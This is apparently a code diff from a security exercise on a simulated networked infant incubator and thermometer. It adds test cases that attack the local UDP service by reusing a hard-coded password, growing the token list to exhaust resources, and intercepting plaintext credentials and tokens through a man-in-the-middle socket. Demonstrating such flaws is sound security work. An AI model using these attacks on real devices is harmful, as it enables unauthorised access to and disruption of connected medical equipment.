@@ -10,6 +10,7 @@ import os
 import errno
 import random
 import string
+from SampleNetworkClient import *
 
 class SmartNetworkThermometer (threading.Thread) :
     open_cmds = ["AUTH", "LOGOUT"]
@@ -191,6 +192,46 @@ sim = infinc.Simulator(infant = bob, incubator = inc, roomTemp = 20 + 273, timeS
 sim.start()
 
 sc = SimpleClient(bobThermo, incThermo)
+
+# Write Test cases
+
+# 1- Get Hard Coded Password
+sock = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
+sock.sendto(b"AUTH !Q#E%T&U8i6y4r2w", ("127.0.0.1", 23456))
+print("sent")
+token, addr = sock.recvfrom(1024)
+token = token.decode()
+print("token", token)
+sock.sendto(("LOGOUT " + token).encode(), ("127.0.0.1", 23456))
+
+# 2- Token List Grows, probably increase to VERY big number?
+for i in range(10):
+    sock.sendto(b"AUTH !Q#E%T&U8i6y4r2w", ("127.0.0.1", 23456))
+    token, addr = sock.recvfrom(1024)
+    token = token.decode()
+    print("DDOS LIST TOKEN", token)
+
+    # because an invalid token is passed, no token is removed in self.list
+    sock.sendto(b"LOGOUT random-token", ("127.0.0.1", 23456))
+
+# 3- Plaintext authentication, use MITM to capture stuff
+mitmSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
+mitmSocket.bind(("127.0.0.2", 23456))
+fcntl.fcntl(mitmSocket, fcntl.F_SETFL, os.O_NONBLOCK)
+
+# Client authenticates, MITM grabs Client Auth Token
+sock.sendto(b"AUTH !Q#E%T&U8i6y4r2w", ("127.0.0.2", 23456))
+auth_password, client_addr = mitmSocket.recvfrom(1024)
+print("MITM STOLE", auth_password)
+
+# MITM captures plaintext password and forwards to server.
+mitmSocket.sendto(auth_password, ("127.0.0.1", 23456))
+# Give MITM time to send the request and have the token stealing time to complete.
+time.sleep(5)
+token, real_server_addr = mitmSocket.recvfrom(1024)
+print("MITM STOLE TOKEN", token, real_server_addr)
+
+# End Test cases
 
 plt.grid()
 plt.show()
